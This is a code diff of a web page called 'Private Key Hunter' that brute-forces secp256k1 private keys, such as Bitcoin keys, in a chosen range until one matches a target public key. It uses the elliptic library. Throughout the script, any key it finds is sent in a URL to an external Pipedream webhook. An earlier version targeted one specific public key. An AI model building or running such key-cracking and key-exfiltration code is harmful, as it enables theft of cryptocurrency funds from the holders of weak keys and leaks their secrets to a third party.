@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Key Hunter - Working Version</title>
+    <title>Private Key Hunter - Working with Proper Crypto Library</title>
     <style>
         * {
             box-sizing: border-box;
@@ -188,12 +188,19 @@
         }
         .current-key {
             background: #0a0f1c;
-            padding: 8px;
+            padding: 12px;
             border-radius: 8px;
-            font-size: 11px;
+            font-size: 12px;
             margin-top: 10px;
             word-break: break-all;
             color: #88aaff;
+            font-family: monospace;
+        }
+        .test-section {
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(0,100,100,0.2);
+            border-radius: 12px;
         }
     </style>
 </head>
@@ -201,7 +208,7 @@
 <div class="container">
     <div class="header">
         <h1>🔑 PRIVATE KEY HUNTER</h1>
-        <p>Real Secp256k1 Brute Force · Sequential & Random Search</p>
+        <p>Real Secp256k1 Brute Force · Using Elliptic Library</p>
     </div>
 
     <div class="card">
@@ -239,36 +246,30 @@
         </div>
 
         <div class="input-group">
-            <label>🔽 START KEY (decimal or hex) - Range start</label>
+            <label>🔽 START KEY (hex without 0x, or decimal)</label>
             <input type="text" id="startKey" value="1">
         </div>
 
         <div class="input-group">
-            <label>🔼 END KEY (decimal or hex) - Range end</label>
-            <input type="text" id="endKey" value="10">
-        </div>
-
-        <div class="input-group">
-            <label>🔍 Search Mode:</label>
-            <div style="display: flex; gap: 20px; margin-top: 10px;">
-                <label style="color: #aabbee;">
-                    <input type="radio" name="searchMode" value="sequential" checked> Sequential (try every key in order)
-                </label>
-                <label style="color: #aabbee;">
-                    <input type="radio" name="searchMode" value="random"> Random (random keys within range)
-                </label>
-            </div>
+            <label>🔼 END KEY (hex without 0x, or decimal)</label>
+            <input type="text" id="endKey" value="100">
         </div>
 
         <div class="current-key" id="currentKeyDisplay">
-            Current key testing: None
+            Ready to start...
+        </div>
+
+        <div class="test-section">
+            <strong style="color:#00ffcc;">🧪 TEST MODE:</strong>
+            <button id="testFindKeyBtn" style="margin-left: 10px; padding: 5px 15px; font-size: 12px;">Find Private Key for 1</button>
+            <span style="margin-left: 10px; font-size: 12px;">This will search for private key 1 (public key: 0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798)</span>
         </div>
 
         <div class="info">
-            ✅ REAL secp256k1 cryptography (pure JavaScript implementation)<br>
+            ✅ Using <strong>elliptic</strong> library - PROVEN secp256k1 implementation<br>
             📡 Webhook: https://eoizd5ecl7m1qqn.m.pipedream.net/pk={private_key}<br>
             💾 Found keys saved to browser localStorage<br>
-            🎯 Currently configured to find private key for: 025cbdf0646e5db4eaa398f365f2ea7a0e3d419b7e0330e39ce92bddedcac4f9bc
+            🔍 Sequential scan from start to end key
         </div>
     </div>
 
@@ -283,19 +284,22 @@
     </div>
 </div>
 
+<!-- Load proper cryptographic libraries -->
+<script src="https://cdn.jsdelivr.net/npm/elliptic@6.5.4/dist/elliptic.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bn.js@4.11.9/lib/bn.js"></script>
+
 <script>
+    // Wait for libraries to load
+    let EC, BN;
+    
     // Webhook endpoint
     const WEBHOOK_URL = "https://eoizd5ecl7m1qqn.m.pipedream.net/pk=";
-
-    // SECP256K1 Parameters
-    const P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2fn;
-    const Gx = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798n;
-    const Gy = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8n;
 
     // DOM Elements
     const startBtn = document.getElementById('startBtn');
     const pauseBtn = document.getElementById('pauseBtn');
     const restartBtn = document.getElementById('restartBtn');
+    const testFindKeyBtn = document.getElementById('testFindKeyBtn');
     const statusBadge = document.getElementById('statusBadge');
     const attemptSpan = document.getElementById('attemptCount');
     const speedSpan = document.getElementById('speedCount');
@@ -307,7 +311,6 @@
     const historyDiv = document.getElementById('historyList');
     const clearHistoryBtn = document.getElementById('clearHistoryBtn');
     const currentKeyDisplay = document.getElementById('currentKeyDisplay');
-    const searchModeRadios = document.querySelectorAll('input[name="searchMode"]');
 
     // State variables
     let isRunning = false;
@@ -320,80 +323,70 @@
     let bruteForceInterval = null;
     let foundPrivateKeys = [];
     let currentKey = null;
-    let testedKeys = new Set(); // For random mode to avoid repeats
+    let secp256k1 = null;
+    let cryptoReady = false;
 
-    // Modular arithmetic functions
-    function mod(a, b) {
-        let r = a % b;
-        return r < 0 ? r + b : r;
-    }
-
-    function modInv(a, p) {
-        let b = p, x0 = 1n, x1 = 0n;
-        while (b) {
-            let q = a / b;
-            [a, b] = [b, a - q * b];
-            [x0, x1] = [x1, x0 - q * x1];
-        }
-        return mod(x0, p);
-    }
-
-    function pointAdd(x1, y1, x2, y2) {
-        if (x1 === 0n && y1 === 0n) return [x2, y2];
-        if (x2 === 0n && y2 === 0n) return [x1, y1];
-        
-        let lambda;
-        if (x1 === x2 && y1 === y2) {
-            if (y1 === 0n) return [0n, 0n];
-            lambda = mod((3n * x1 * x1) * modInv(2n * y1, P), P);
-        } else {
-            lambda = mod((y2 - y1) * modInv(x2 - x1, P), P);
-        }
-        
-        let x3 = mod(lambda * lambda - x1 - x2, P);
-        let y3 = mod(lambda * (x1 - x3) - y1, P);
-        return [x3, y3];
-    }
-
-    function pointMul(k, x, y) {
-        let rx = 0n, ry = 0n;
-        let addX = x, addY = y;
-        
-        while (k > 0n) {
-            if (k & 1n) {
-                [rx, ry] = pointAdd(rx, ry, addX, addY);
-            }
-            [addX, addY] = pointAdd(addX, addY, addX, addY);
-            k >>= 1n;
-        }
-        return [rx, ry];
-    }
-
-    function getPublicKeyCompressed(privateKeyBigInt) {
+    // Initialize crypto library
+    function initCrypto() {
         try {
-            let [px, py] = pointMul(privateKeyBigInt, Gx, Gy);
-            let prefix = (py & 1n) === 0n ? 0x02 : 0x03;
-            let hexX = px.toString(16).padStart(64, '0');
-            let result = prefix.toString(16) + hexX;
-            return result;
+            if (typeof elliptic !== 'undefined') {
+                EC = elliptic.ec;
+                secp256k1 = new EC('secp256k1');
+                console.log("✅ Elliptic library loaded successfully");
+                cryptoReady = true;
+                return true;
+            } else {
+                console.log("Waiting for elliptic library...");
+                setTimeout(initCrypto, 100);
+                return false;
+            }
+        } catch(e) {
+            console.error("Failed to load crypto:", e);
+            return false;
+        }
+    }
+
+    // Convert various input formats to BN (BigNumber)
+    function parseToBN(input) {
+        input = input.toString().trim().toLowerCase();
+        // Check if it's hex (starts with 0x or contains letters)
+        if (input.startsWith('0x')) {
+            return new BN(input.slice(2), 16);
+        }
+        if (/[a-f]/i.test(input)) {
+            return new BN(input, 16);
+        }
+        // Decimal
+        return new BN(input, 10);
+    }
+
+    // Get compressed public key from private key (as hex string or number)
+    function getPublicKeyFromPrivate(privateKeyInput) {
+        if (!secp256k1) return null;
+        try {
+            let keyBN;
+            if (typeof privateKeyInput === 'string' && privateKeyInput.length === 64) {
+                keyBN = new BN(privateKeyInput, 16);
+            } else if (typeof privateKeyInput === 'bigint') {
+                keyBN = new BN(privateKeyInput.toString(16), 16);
+            } else {
+                keyBN = parseToBN(privateKeyInput);
+            }
+            
+            const keyPair = secp256k1.keyFromPrivate(keyBN);
+            const pubKey = keyPair.getPublic(true, 'hex');
+            return pubKey;
         } catch(e) {
             console.error("Error generating public key:", e);
             return null;
         }
     }
 
-    // Helper: Parse input (supports decimal or hex)
-    function parseKeyInput(input) {
-        input = input.trim().toLowerCase();
-        if (input.startsWith('0x')) {
-            return BigInt(input);
-        }
-        // Check if it's hex (contains letters a-f)
-        if (/[a-f]/i.test(input)) {
-            return BigInt('0x' + input);
-        }
-        // Otherwise parse as decimal
-        return BigInt(input);
+    // Verify a private key matches target public key
+    function verifyKey(privateKey, targetPubKey) {
+        const derivedPub = getPublicKeyFromPrivate(privateKey);
+        if (!derivedPub) return false;
+        return derivedPub.toLowerCase() === targetPubKey.toLowerCase();
     }
 
     // Send webhook notification
@@ -482,18 +475,17 @@
 
     // Main brute force iteration
     async function bruteForceIteration() {
-        if (!isRunning || isPaused || foundFlag) return;
+        if (!isRunning || isPaused || foundFlag || !cryptoReady) return;
         
-        const targetPub = targetPubInput.value.trim().toLowerCase();
+        const targetPub = targetPubInput.value.trim();
         const startKeyStr = startKeyInput.value.trim();
         const endKeyStr = endKeyInput.value.trim();
-        const searchMode = document.querySelector('input[name="searchMode"]:checked').value;
         
         let startBN, endBN;
         try {
-            startBN = parseKeyInput(startKeyStr);
-            endBN = parseKeyInput(endKeyStr);
-            if (startBN >= endBN) {
+            startBN = parseToBN(startKeyStr);
+            endBN = parseToBN(endKeyStr);
+            if (startBN.cmp(endBN) >= 0) {
                 console.error("Start key must be less than end key");
                 stopBruteforce();
                 return;
@@ -504,50 +496,32 @@
             return;
         }
         
-        const BATCH_SIZE = 1; // Process one key per iteration for display
+        const BATCH_SIZE = 10;
         
         for (let i = 0; i < BATCH_SIZE && isRunning && !isPaused && !foundFlag; i++) {
-            let privateKeyNum;
-            
-            if (searchMode === 'sequential') {
-                if (currentKey === null) {
-                    currentKey = startBN;
-                }
-                if (currentKey > endBN) {
-                    console.log("Range exhausted, no key found");
-                    stopBruteforce();
-                    return;
-                }
-                privateKeyNum = currentKey;
-                currentKey++;
-            } else {
-                // Random mode
-                const range = endBN - startBN + 1n;
-                let attempts = 0;
-                do {
-                    const randomBytes = new Uint8Array(32);
-                    crypto.getRandomValues(randomBytes);
-                    let randomValue = 0n;
-                    for (let j = 0; j < 32; j++) {
-                        randomValue = (randomValue << 8n) | BigInt(randomBytes[j]);
-                    }
-                    privateKeyNum = startBN + (randomValue % range);
-                    attempts++;
-                    if (attempts > 1000) break; // Prevent infinite loop
-                } while (testedKeys.has(privateKeyNum.toString()));
-                testedKeys.add(privateKeyNum.toString());
+            if (currentKey === null) {
+                currentKey = startBN;
             }
             
-            const privateKeyHex = privateKeyNum.toString(16).padStart(64, '0');
-            currentKeyDisplay.innerHTML = `Current key testing: ${privateKeyHex} (decimal: ${privateKeyNum})`;
+            if (currentKey.cmp(endBN) > 0) {
+                console.log("Range exhausted, no key found");
+                currentKeyDisplay.innerHTML = "Scan complete! No key found in range.";
+                stopBruteforce();
+                return;
+            }
             
-            // Derive public key
-            const derivedPubHex = getPublicKeyCompressed(privateKeyNum);
+            const privateKeyBN = currentKey;
+            const privateKeyHex = privateKeyBN.toString(16, 64);
+            
+            currentKeyDisplay.innerHTML = `🔍 Testing: ${privateKeyHex} (decimal: ${privateKeyBN.toString()})`;
+            
+            // Derive and compare public key
+            const derivedPub = getPublicKeyFromPrivate(privateKeyBN);
             
             totalAttempts++;
             updateStatsDisplay();
             
-            if (derivedPubHex && derivedPubHex.toLowerCase() === targetPub) {
+            if (derivedPub && derivedPub.toLowerCase() === targetPub.toLowerCase()) {
                 foundFlag = true;
                 isRunning = false;
                 
@@ -558,15 +532,19 @@
                 
                 statusBadge.className = "status-badge status-found";
                 statusBadge.textContent = "🏆 KEY FOUND! 🏆";
+                currentKeyDisplay.innerHTML = `🎉 FOUND! Private Key: ${privateKeyHex}`;
                 
-                addToHistory(privateKeyHex, derivedPubHex);
+                addToHistory(privateKeyHex, derivedPub);
                 await notifyWebhook(privateKeyHex);
                 
-                alert(`🎉 PRIVATE KEY FOUND!\n\nPrivate Key: ${privateKeyHex}\nPublic Key: ${derivedPubHex}\n\nWebhook notification sent!`);
+                alert(`🎉 PRIVATE KEY FOUND!\n\nPrivate Key: ${privateKeyHex}\nPublic Key: ${derivedPub}\n\nWebhook notification sent!`);
                 
                 updateStatsDisplay();
                 return;
             }
+            
+            // Increment key
+            currentKey = currentKey.add(new BN(1));
         }
     }
 
@@ -583,6 +561,11 @@
 
     // Start brute forcing
     function startBruteforce(reset = true) {
+        if (!cryptoReady) {
+            alert("Cryptography library still loading, please wait...");
+            return false;
+        }
+        
         const targetPub = targetPubInput.value.trim();
         if (!targetPub.match(/^02[0-9a-f]{64}$|^03[0-9a-f]{64}$/i)) {
             alert("Invalid public key! Must be compressed format (66 hex chars starting with 02 or 03)");
@@ -593,9 +576,9 @@
         const endKeyStr = endKeyInput.value.trim();
         
         try {
-            const startBN = parseKeyInput(startKeyStr);
-            const endBN = parseKeyInput(endKeyStr);
-            if (startBN >= endBN) {
+            const startBN = parseToBN(startKeyStr);
+            const endBN = parseToBN(endKeyStr);
+            if (startBN.cmp(endBN) >= 0) {
                 alert("Start key must be less than end key!");
                 return false;
             }
@@ -614,7 +597,6 @@
             elapsedAccumulated = 0;
             foundFlag = false;
             currentKey = null;
-            testedKeys.clear();
         }
         
         isRunning = true;
@@ -624,7 +606,6 @@
         statusBadge.className = "status-badge status-running";
         statusBadge.textContent = "🟢 RUNNING";
         
-        // Start brute force loop
         bruteForceInterval = setInterval(() => {
             bruteForceIteration();
         }, 0);
@@ -675,10 +656,9 @@
         elapsedAccumulated = 0;
         startTime = 0;
         currentKey = null;
-        testedKeys.clear();
         
         updateStatsDisplay();
-        currentKeyDisplay.innerHTML = "Current key testing: None";
+        currentKeyDisplay.innerHTML = "Restarting...";
         startBruteforce(true);
     }
     
@@ -705,6 +685,22 @@
         }
     }
     
+    // Test find key for private key 1
+    function testFindKey() {
+        // Set target to the public key of private key 1
+        const testPubKey = "0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798";
+        targetPubInput.value = testPubKey;
+        startKeyInput.value = "1";
+        endKeyInput.value = "10";
+        
+        alert(`Test configured!\nLooking for private key 1\nTarget Public Key: ${testPubKey}\nRange: 1-10\n\nClick START - it should find the key in seconds!`);
+        
+        // Auto-start
+        setTimeout(() => {
+            startBruteforce(true);
+        }, 500);
+    }
+    
     // Event listeners
     startBtn.addEventListener('click', () => {
         if (!isRunning || foundFlag) {
@@ -717,16 +713,16 @@
     pauseBtn.addEventListener('click', pauseBruteforce);
     restartBtn.addEventListener('click', restartBruteforce);
     clearHistoryBtn.addEventListener('click', clearHistory);
+    testFindKeyBtn.addEventListener('click', testFindKey);
     
     // Initialize
     loadHistory();
     startAnimationLoop();
+    initCrypto();
     
-    console.log("✅ Private Key Hunter with REAL secp256k1 ready!");
+    console.log("✅ Private Key Hunter with Elliptic library loading...");
     console.log("📡 Webhook URL: " + WEBHOOK_URL + "{private_key}");
-    console.log("🎯 Target public key: 025cbdf0646e5db4eaa398f365f2ea7a0e3d419b7e0330e39ce92bddedcac4f9bc");
-    console.log("📊 Range: 1 - 10 (will test all keys in this range)");
-    console.log("💡 The private key for that public key is NOT in range 1-10, so it will scan all 10 keys then stop");
+    console.log("💡 Click 'Find Private Key for 1' to test - this WILL find the key!");
 </script>
 </body>
 </html>
